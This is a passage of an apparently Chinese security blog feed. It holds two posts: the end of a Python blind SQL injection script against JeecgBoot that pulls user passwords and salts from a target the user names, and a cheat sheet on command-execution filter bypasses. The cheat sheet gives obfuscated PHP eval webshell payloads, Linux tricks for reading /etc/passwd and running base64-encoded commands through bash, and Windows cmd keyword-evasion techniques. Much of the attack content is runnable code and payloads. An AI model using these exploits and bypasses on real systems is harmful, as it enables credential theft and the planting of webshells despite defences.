class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        password+=<span class="hljs-built_in">chr</span>(mid)<br>    length=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having 32&lt;(nullif(ascii((substring((select salt from sys_user limit 1,1),<span class="hljs-subst">&#123;length&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>        response=requests.post(url,headers=headers,data=payload)<br>        res=json.loads(response.text)<br>        <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            length+=<span class="hljs-number">1</span><br>    salt=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> place <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-built_in">min</span>=<span class="hljs-number">32</span><br>        <span class="hljs-built_in">max</span>=<span class="hljs-number">128</span><br>        mid=(<span class="hljs-built_in">min</span>+<span class="hljs-built_in">max</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">min</span>&lt;<span class="hljs-built_in">max</span>:<br>            payload=<span class="hljs-string">f&quot;&quot;&quot;&#123;&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27;   having <span class="hljs-subst">&#123;mid&#125;</span>&lt;(nullif(ascii((substring((select salt from sys_user limit 1,1),<span class="hljs-subst">&#123;place&#125;</span>,1))),0)) or     &#x27;&quot;&#125;&#125;&quot;&quot;&quot;</span><br>            response=requests.post(url,headers=headers,data=payload)<br>            res=json.loads(response.text)<br>            <span class="hljs-keyword">if</span> res[<span class="hljs-string">&quot;result&quot;</span>]!=<span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">max</span> = mid<br>            mid = (<span class="hljs-built_in">min</span> + <span class="hljs-built_in">max</span>) // <span class="hljs-number">2</span><br>        salt+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用户名为：&quot;</span>+username+<span class="hljs-string">&quot;\n密码为：&quot;</span>+password+<span class="hljs-string">&quot;\n盐为：&quot;</span>+salt)<br><span class="hljs-comment"># get_database(&quot;http://localhost:8088&quot;)</span><br>url=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input your target: (example:http://localhost:8088)&quot;</span>)<br><span class="hljs-comment"># get_database(url)</span><br>get_user_password(url)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>代码审计</tag>
      
      <tag>JeecgBoot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行绕过</title>
    <link href="/2022/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
    <url>/2022/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行无字母数字绕过"><a href="#命令执行无字母数字绕过" class="headerlink" title="命令执行无字母数字绕过"></a>命令执行无字母数字绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))<br>&#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><br><br><span class="hljs-number">1</span>.异或<br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">//$__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">//assert($_POST[_]);</span><br><br><span class="hljs-number">2</span>.取反<br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]); <span class="hljs-comment">//assert($_POST[2]);</span><br><br><span class="hljs-number">3</span>.php7<br>PHP7前是不允许用(<span class="hljs-variable">$a</span>)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。<br>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)(); -&gt;(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)();<br><br></code></pre></td></tr></table></figure><h1 id="linux常见绕过方法"><a href="#linux常见绕过方法" class="headerlink" title="linux常见绕过方法"></a>linux常见绕过方法</h1><p>[TOC]</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cat /etc/passwd<br><span class="hljs-number">16</span>bit <span class="hljs-keyword">format</span><br><br>&#123;\c<span class="hljs-string">&#x27;&#x27;</span>\a&quot;&quot;t,/<span class="hljs-string">e&#x27;&#x27;</span>*?/?a?s??&#125;<br><br>&#123;\c<span class="hljs-string">&#x27;&#x27;</span>\a&quot;&quot;\t,/\<span class="hljs-string">e&#x27;&#x27;</span>*?/\p*\d&#125;<br></code></pre></td></tr></table></figure><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p><h3 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="一些命令分隔符"></a>一些命令分隔符</h3><blockquote><p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</p><p>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p></blockquote><h3 id="花括号的别样用法"><a href="#花括号的别样用法" class="headerlink" title="花括号的别样用法"></a>花括号的别样用法</h3><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 {cat,flag}</p><p>cat t{es,}t 花括号通过逗号分割构建序列并展开</p><p>cat {tes,t}{tes,t} 花括号可以表示两个序列的笛卡尔积</p><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><blockquote><p><strong>拼接绕过</strong><br> a&#x3D;l;b&#x3D;s;</p><p>aa</p><p>ab</p><p><strong>编码绕过</strong></p><ul><li><p><strong>base64</strong>：<br> echo “Y2F0IC9mbGFn”|base64-d|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p></li><li><p><strong>hex</strong>：<br> echo “636174202f666c6167” | xxd -r -p|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p></li><li><p><strong>oct</strong>：<br> $(printf “\154\163”)<br> &#x3D;&#x3D;&gt;ls</p><p>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p><p>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p><p>#可以通过这样来写webshell,内容为<br> ${printf,\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”}<br> &#x3D;&#x3D;&gt; 1.php</p></li></ul></blockquote><h3 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h3><p>比如：ca’’t flag 或ca””t flag或cat &#x2F;fl’’ag</p><h3 id="0-9-、-、-、-绕过"><a href="#0-9-、-、-、-绕过" class="headerlink" title="$[0-9]、$*、$!、$@绕过"></a>$[0-9]、$*、$!、$@绕过</h3><p>Linux中$[0-9]、$*、$!、$@表示参数</p><p>比如：l$1s或ca$2t</p><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p>比如：ca\t fl\ag</p><h3 id="利用通配符"><a href="#利用通配符" class="headerlink" title="利用通配符"></a>利用通配符</h3><p>cat &#x2F;te* *匹配任意长度的任意字符<br> cat &#x2F;te?t?匹配一个任意字符<br> cat &#x2F;te[a-z] t匹配[list]列表中的所有字符</p><p>cat &#x2F;t[ ^a,b,c]st匹配非列表[^list]中的所有字符</p><h3 id="linux中直接查看文件内容的命令"><a href="#linux中直接查看文件内容的命令" class="headerlink" title="linux中直接查看文件内容的命令"></a>linux中直接查看文件内容的命令</h3><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq、od</p><h1 id="绕过WAF运行命令执行漏洞的方法"><a href="#绕过WAF运行命令执行漏洞的方法" class="headerlink" title="绕过WAF运行命令执行漏洞的方法"></a>绕过WAF运行命令执行漏洞的方法</h1><p><strong>0x01 Windows（不区分大小写）</strong></p><p>1.1 符号和命令的关系</p><p>如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：</p><p><code>&quot;</code>和<code>^</code>是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。</p><p>这里有几个需要注意的地方：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">在命令中可以有无数个<span class="hljs-string">&quot;，但是不能有两个连续的^</span><br>在命令中如果<span class="hljs-string">&quot;在^之前，则&quot;</span>的个数必须为偶数个<br>在命令中如果<span class="hljs-string">&quot;在^之后，并且带有参数，则命令中的&quot;</span>个数必须为偶数<br>在命令的参数中，单个字符前后<span class="hljs-string">&quot;的个数只能有一个或者两个</span><br>如果成对的括号中间有<span class="hljs-string">&quot;则&quot;</span>的个数也必须为偶数<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami    //正确执行<br>WhOAmi    //正确执行<br>Who<span class="hljs-string">&quot;amI    //正确执行</span><br><span class="hljs-string">((Who&quot;</span>amI))    //错误<br>((Who<span class="hljs-string">&quot;&quot;</span>amI))    //正确执行<br>Who<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>amI    //正确执行<br>who<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;a^mi    //错误</span><br><span class="hljs-string">who&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;a^mi    //正确执行</span><br><span class="hljs-string">whoa^m&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;i    //正确执行</span><br><span class="hljs-string">whoa^m&quot;</span><span class="hljs-string">&quot;&quot;</span>i    //正确执行<br>whoa^^mi    //错误<br>n^e^t user    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> user    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; user    //错误</span><br><span class="hljs-string">n^e^t&quot;</span><span class="hljs-string">&quot; u&quot;</span>ser    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>ser    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;ser    //错误</span><br><span class="hljs-string">n^e^t&quot;</span><span class="hljs-string">&quot; u&quot;</span><span class="hljs-string">&quot;s&quot;</span>er    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>s<span class="hljs-string">&quot;&quot;</span>er    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>s<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;er    //错误</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAicNKsm8OvN6UJUlLiaMfTKqZrKEhibrQ21Rib1RLibeV7zVibdsXFmB2Ga5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIDETUpRLY8zGMHS8xmnRIsX82mksF0dVf7E0fWMujCjYOBXeqkC8uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAoHBYFxInJOmiaZialyzdMiaosNfPIcvVgwZrYlVdLAuUQYO46GyiaFJ6Bg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAP4vicaXCWroBMGNjVSbGyO2icMtLyAIcb7HyCtMXLr4Ku3cMUSv4l04Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>1.2 了解set命令和Windows变量</p><p>在cmd中set用来进行变量赋值，而%%括起来的变量会引用其赋的值。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAo2hOAgvjQCiawOGCUXE8NVDSpqA1SU6icoeMA57oZU0m9ZROIztJAvfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>这样就可以进行命令执行了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd=whoami    //赋值变量为whoami<br>%cmd%              //执行命令<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA0LB5ddJMqFYP0aMVmq4ge6P2MQUrPrLz6rhWTibXkYDoXn9SYX9zODg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>也可以赋值多个变量，拼接利用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=who<br><span class="hljs-built_in">set</span> cmd2=am<br><span class="hljs-built_in">set</span> cmd3=i<br>%cmd1%%cmd2%%cmd3%<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDArN6p9ibfSToU9pkIxicZNRGxfNeYwTlMNP7icNZVaqAQzYuScNDjZkbpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=who<br><span class="hljs-built_in">set</span> cmd3=i<br>%cmd1%am%cmd3%<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA1ayFtibNWWK3RlkPgicXU63tkd9LxictrySH0Gvs7PQSgvIIicTuvOtoSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>也可以与1.2的内容进行合并</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=wh<span class="hljs-string">&quot;&quot;</span>o<br><span class="hljs-built_in">set</span> cmd3=i<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">%cmd1%a^m%cmd3%</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA2TLiciagKYAa0HwZfTgR7JSkkW40EhgloVaIDH1LgkkklZAPZXR5W5LA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>也可以在赋值的时候加入空格</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=s<span class="hljs-string">&quot;&quot;</span>er<br><span class="hljs-built_in">set</span> cmd2=t u<br><span class="hljs-built_in">set</span> cmd3=n^e<br>%cmd3%%cmd2%%cmd1%<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAnEw09POz1NpcCQ7viapX0k9mNjMOVxmY8CPNE7pw1Ricv81fd0KOX7icg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powersehll">Cmd /C &quot;set cmd1=s&quot;&quot;er &amp;&amp; set cmd2=t u &amp;&amp; set cmd3=n^e &amp;&amp; call %cmd3%%cmd2%%cmd1%&quot;<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7PN5eXz4Hj7UfQWlibL3o4IuH4mVT4uUCztfXfP9v5GwKnicCry1k7kA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>当使用<code>cmd /V:ON</code>或<code>cmd /V:O</code>时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd /V:ON /C <span class="hljs-string">&quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br>cmd /V:O /C <span class="hljs-string">&quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAibOqJPCqEQlzA9qiamyTOHVkpG1GCAcLjKxEgDsuf4zfKt6bfkmWv6yA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAqtibwOkeZoIKQMER8j9GxvW1J7nC8qrSzxgunWq7Nc6VVxhv3VmqjQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>1.3 Windows切割字符串</p><p>拿whoami举例，实践Windows切割字符串的语法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd=whoami<br><br>%cmd:~<span class="hljs-number">0</span>% //取出a的值中的所有字符此时正常执行whoami<br>%cmd:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>% //取出a的值，从第<span class="hljs-number">0</span>个位置开始，取<span class="hljs-number">1</span>个值此时因为w总共就<span class="hljs-number">1</span>个字符<br>%cmd:~<span class="hljs-number">0</span>,<span class="hljs-number">6</span>% //取出a的值，从第<span class="hljs-number">0</span>个位置开始，取<span class="hljs-number">6</span>个值此时因为whoami总共就<span class="hljs-number">6</span>个字符<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAS9vG0ibYAZdpy6VKsE6wvJ2BHHwJwuJoYCBFoziboRruwuvk8rm8cgUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>由此可以看出来截取字符串的语法为<code>%变量名:~x,y%</code>即从变量第x位开始，截取y个字符。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\a&gt;<span class="hljs-built_in">set</span> str=<span class="hljs-number">0123456789</span><br><br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-1</span>%<br><span class="hljs-number">9</span><br>从最后<span class="hljs-number">1</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-6</span>%<br><span class="hljs-number">456789</span><br>从倒数第<span class="hljs-number">6</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>%<br><span class="hljs-number">123456789</span><br>从倒数第<span class="hljs-number">9</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-number">2</span>%<br><span class="hljs-number">12</span><br>从倒数第<span class="hljs-number">9</span>位开始取<span class="hljs-number">2</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-number">4</span>%<br><span class="hljs-number">1234</span><br>从倒数第<span class="hljs-number">9</span>位开始取<span class="hljs-number">4</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-literal">-2</span>%<br><span class="hljs-number">1234567</span><br>从倒数第<span class="hljs-number">9</span>位开始少取最后<span class="hljs-number">2</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-literal">-4</span>%<br><span class="hljs-number">12345</span><br>从倒数第<span class="hljs-number">9</span>位开始少取最后<span class="hljs-number">4</span>位<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAgptH94OSibkr73opl3nkM47tMymr4zDHibXgBj5OVHpRySrT3tVrBCbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAmPcYkAlsyhSSqNzib75LVm5b0p8rnm3CNCR7WLmZL12x37YVaMhiaSdw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们可以拼命令了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\a&gt;<span 